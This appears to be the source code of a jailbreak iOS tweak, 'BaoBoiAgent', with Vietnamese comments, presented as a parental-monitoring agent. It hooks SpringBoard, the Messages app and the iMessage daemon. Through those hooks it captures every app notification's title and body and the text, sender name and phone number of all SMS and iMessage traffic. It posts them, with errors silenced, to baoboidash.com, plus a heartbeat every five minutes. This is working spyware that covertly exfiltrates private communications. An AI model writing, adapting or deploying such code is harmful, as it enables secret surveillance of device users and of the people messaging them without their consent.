// BaoBoiAgent Tweak - v1.4.1
// Tách hook theo process:
//   - SpringBoard: URL scheme setup + heartbeat + thông báo
//   - MobileSMS / imagent: hook SMS/iMessage

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <UserNotifications/UserNotifications.h>

// ─── Cấu hình ────────────────────────────────────────────────────────────────
static NSString *const kServerURL = @"https://baoboidash.com/api/trpc/device.log";
static NSString *const kDeviceTokenKey = @"BaoBoiDeviceToken";

// Lấy deviceToken đã lưu trong UserDefaults
static NSString *getDeviceToken() {
    NSUserDefaults *defaults = [[NSUserDefaults alloc] initWithSuiteName:@"com.baoboi.agent"];
    NSString *token = [defaults stringForKey:kDeviceTokenKey];
    if (!token || token.length == 0) {
        token = [[NSUserDefaults standardUserDefaults] stringForKey:kDeviceTokenKey];
    }
    return token ?: @"";
}

// Lưu deviceToken
static void saveDeviceToken(NSString *token) {
    NSUserDefaults *suite = [[NSUserDefaults alloc] initWithSuiteName:@"com.baoboi.agent"];
    [suite setObject:token forKey:kDeviceTokenKey];
    [suite synchronize];
    [[NSUserDefaults standardUserDefaults] setObject:token forKey:kDeviceTokenKey];
    [[NSUserDefaults standardUserDefaults] synchronize];
}

// Gửi POST request bất đồng bộ lên server
static void sendToServer(NSDictionary *payload) {
    NSString *token = getDeviceToken();
    if (token.length == 0) return;

    NSMutableDictionary *body = [payload mutableCopy];
    body[@"deviceToken"] = token;

    NSDictionary *trpcBody = @{ @"json": body };

    NSError *error = nil;
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:trpcBody options:0 error:&error];
    if (!jsonData || error) return;

    NSURL *url = [NSURL URLWithString:kServerURL];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    request.HTTPMethod = @"POST";
    request.HTTPBody = jsonData;
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    request.timeoutInterval = 10;

    NSURLSessionDataTask *task = [[NSURLSession sharedSession]
        dataTaskWithRequest:request
        completionHandler:^(NSData *data, NSURLResponse *response, NSError *err) {
            // Silent
        }];
    [task resume];
}

// Helper: gửi heartbeat
static void sendHeartbeat() {
    UIDevice *device = [UIDevice currentDevice];
    NSDictionary *payload = @{
        @"event": @"device_online",
        @"deviceName": device.name ?: @"iPhone",
        @"systemVersion": device.systemVersion ?: @"",
        @"model": device.model ?: @"iPhone",
    };
    sendToServer(payload);
}

// ─── Helper gửi tin nhắn ─────────────────────────────────────────────────────
static void sendMessageEvent(NSString *text, NSString *senderName, NSString *senderPhone,
                              NSString *platform, BOOL isIncoming, long long sentAtMs) {
    if (text.length == 0) return;
    NSDictionary *payload = @{
        @"event": @"new_message",
        @"msgContent": text,
        @"msgSenderName": senderName ?: @"",
        @"msgSenderPhone": senderPhone ?: @"",
        @"msgPlatform": platform ?: @"sms",
        @"msgIsIncoming": @(isIncoming),
        @"msgSentAt": @(sentAtMs),
    };
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        sendToServer(payload);
    });
}

// ─── Chỉ chạy trong SpringBoard ──────────────────────────────────────────────
%group SpringBoardHooks

// Hook URL scheme baoboi://
%hook SpringBoard

- (void)applicationOpenURL:(NSURL *)url {
    if (url && [[url scheme] isEqualToString:@"baoboi"]) {
        if ([[url host] isEqualToString:@"setup"]) {
            NSURLComponents *components = [NSURLComponents componentsWithURL:url
                                                     resolvingAgainstBaseURL:NO];
            NSString *token = nil;
            for (NSURLQueryItem *item in components.queryItems) {
                if ([item.name isEqualToString:@"token"]) {
                    token = item.value;
                    break;
                }
            }

            if (token && token.length > 0) {
                saveDeviceToken(token);

                dispatch_async(dispatch_get_main_queue(), ^{
                    UIAlertController *alert = [UIAlertController
                        alertControllerWithTitle:@"✅ Bảo Bối Đã Kích Hoạt"
                        message:@"Thiết bị đã được kết nối với tài khoản phụ huynh thành công."
                        preferredStyle:UIAlertControllerStyleAlert];
                    [alert addAction:[UIAlertAction actionWithTitle:@"OK"
                                                             style:UIAlertActionStyleDefault
                                                           handler:nil]];
                    UIViewController *rootVC = nil;
                    for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
                        if ([scene isKindOfClass:[UIWindowScene class]] && scene.activationState == UISceneActivationStateForegroundActive) {
                            for (UIWindow *w in scene.windows) {
                                if (w.isKeyWindow) { rootVC = w.rootViewController; break; }
                            }
                        }
                        if (rootVC) break;
                    }
                    if (!rootVC) {
                        rootVC = [UIApplication sharedApplication].windows.firstObject.rootViewController;
                    }
                    [rootVC presentViewController:alert animated:YES completion:nil];
                });

                // Gửi heartbeat sau 2 giây
                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC),
                               dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
                    sendHeartbeat();
                });
            }
            return;
        }
    }
    %orig;
}

%end

// Hook thông báo từ tất cả app (chỉ trong SpringBoard)
%hook NCNotificationRequest

- (id)initWithSectionIdentifier:(NSString *)sectionId
             notificationRecord:(id)record {
    id orig = %orig;
    if (!orig) return orig;

    @try {
        UNNotificationContent *content = nil;
        NSString *bundleId = sectionId ?: @"";

        if ([record respondsToSelector:@selector(notificationContent)]) {
            content = [record performSelector:@selector(notificationContent)];
        } else if ([record respondsToSelector:@selector(request)]) {
            UNNotificationRequest *req = [record performSelector:@selector(request)];
            content = req.content;
        }

        NSString *title = content.title ?: @"";
        NSString *body = content.body ?: @"";
        NSString *appName = @"";

        if (bundleId.length > 0) {
            NSBundle *bundle = [NSBundle bundleWithIdentifier:bundleId];
            appName = bundle.infoDictionary[@"CFBundleDisplayName"]
                   ?: bundle.infoDictionary[@"CFBundleName"]
                   ?: bundleId;
        }

        if ([bundleId isEqualToString:@"com.baoboi.agent"]) return orig;
        if (title.length == 0 && body.length == 0) return orig;

        NSDictionary *payload = @{
            @"event": @"app_notification",
            @"notifBundleId": bundleId,
            @"notifAppName": appName,
            @"notifTitle": title,
            @"notifBody": body,
        };

        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
            sendToServer(payload);
        });
    } @catch (NSException *e) {
        // Silent fail
    }

    return orig;
}

%end

%end // SpringBoardHooks

// ─── Chỉ chạy trong MobileSMS ────────────────────────────────────────────────
%group MobileSMSHooks

// Hook CKMessagesController để bắt tin nhắn mới trong app Tin nhắn
%hook CKMessagesController

- (void)conversationList:(id)list didReceiveMessages:(NSArray *)messages {
    %orig;
    @try {
        for (id message in messages) {
            NSString *text = @"";
            NSString *senderHandle = @"";
            NSString *senderName = @"";
            BOOL isIncoming = YES;
            long long sentTime = (long long)([[NSDate date] timeIntervalSince1970] * 1000);

            if ([message respondsToSelector:@selector(text)]) {
                text = [message performSelector:@selector(text)] ?: @"";
            }
            if ([message respondsToSelector:@selector(sender)]) {
                id sender = [message performSelector:@selector(sender)];
                if ([sender respondsToSelector:@selector(ID)]) {
                    senderHandle = [sender performSelector:@selector(ID)] ?: @"";
                }
                if ([sender respondsToSelector:@selector(name)]) {
                    senderName = [sender performSelector:@selector(name)] ?: @"";
                }
            }
            if ([message respondsToSelector:@selector(isFromMe)]) {
                isIncoming = ![[message performSelector:@selector(isFromMe)] boolValue];
            }
            if ([message respondsToSelector:@selector(time)]) {
                id timeVal = [message performSelector:@selector(time)];
                if ([timeVal isKindOfClass:[NSDate class]]) {
                    sentTime = (long long)([(NSDate *)timeVal timeIntervalSince1970] * 1000);
                }
            }

            sendMessageEvent(text,
                             senderName.length > 0 ? senderName : senderHandle,
                             senderHandle,
                             @"sms",
                             isIncoming,
                             sentTime);
        }
    } @catch (NSException *e) {
        // Silent fail
    }
}

%end

%end // MobileSMSHooks

// ─── Chỉ chạy trong imagent (iMessage daemon) ────────────────────────────────
%group ImagentHooks

// Hook CKConversation để bắt tin nhắn mới qua imagent
%hook CKConversation

- (void)_handleIncomingMessage:(id)message {
    %orig;
    @try {
        NSString *text = @"";
        NSString *senderHandle = @"";
        NSString *senderName = @"";
        BOOL isIncoming = YES;
        long long sentTime = (long long)([[NSDate date] timeIntervalSince1970] * 1000);
        NSString *platform = @"imessage";

        if ([message respondsToSelector:@selector(text)]) {
            text = [message performSelector:@selector(text)] ?: @"";
        }
        if ([message respondsToSelector:@selector(sender)]) {
            id sender = [message performSelector:@selector(sender)];
            if ([sender respondsToSelector:@selector(ID)]) {
                senderHandle = [sender performSelector:@selector(ID)] ?: @"";
            }
            if ([sender respondsToSelector:@selector(name)]) {
                senderName = [sender performSelector:@selector(name)] ?: @"";
            }
        }
        if ([message respondsToSelector:@selector(isFromMe)]) {
            isIncoming = ![[message performSelector:@selector(isFromMe)] boolValue];
        }
        if ([message respondsToSelector:@selector(time)]) {
            id timeVal = [message performSelector:@selector(time)];
            if ([timeVal isKindOfClass:[NSDate class]]) {
                sentTime = (long long)([(NSDate *)timeVal timeIntervalSince1970] * 1000);
            }
        }
        // Phân biệt SMS và iMessage
        if ([message respondsToSelector:@selector(service)]) {
            id service = [message performSelector:@selector(service)];
            if ([service respondsToSelector:@selector(name)]) {
                NSString *svcName = [service performSelector:@selector(name)] ?: @"";
                if ([svcName containsString:@"SMS"] || [svcName containsString:@"MMS"]) {
                    platform = @"sms";
                }
            }
        }

        sendMessageEvent(text,
                         senderName.length > 0 ? senderName : senderHandle,
                         senderHandle,
                         platform,
                         isIncoming,
                         sentTime);
    } @catch (NSException *e) {
        // Silent fail
    }
}

%end

%end // ImagentHooks

// ─── Heartbeat định kỳ (mỗi 5 phút) ─────────────────────────────────────────
%ctor {
    // Kích hoạt đúng group theo process đang chạy
    NSString *processName = [[NSProcessInfo processInfo] processName];

    if ([processName isEqualToString:@"SpringBoard"]) {
        %init(SpringBoardHooks);
    } else if ([processName isEqualToString:@"MobileSMS"]) {
        %init(MobileSMSHooks);
    } else if ([processName isEqualToString:@"imagent"]) {
        %init(ImagentHooks);
    } else {
        return; // Không inject vào process khác
    }

    // Heartbeat định kỳ (chỉ từ SpringBoard để tránh duplicate)
    if ([processName isEqualToString:@"SpringBoard"]) {
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC),
                       dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
            sendHeartbeat();
        });

        dispatch_source_t timer = dispatch_source_create(
            DISPATCH_SOURCE_TYPE_TIMER, 0, 0,
            dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0)
        );
        dispatch_source_set_timer(timer,
            dispatch_time(DISPATCH_TIME_NOW, 5 * 60 * NSEC_PER_SEC),
            5 * 60 * NSEC_PER_SEC,
            10 * NSEC_PER_SEC
        );
        dispatch_source_set_event_handler(timer, ^{
            sendHeartbeat();
        });
        dispatch_resume(timer);
    }
}
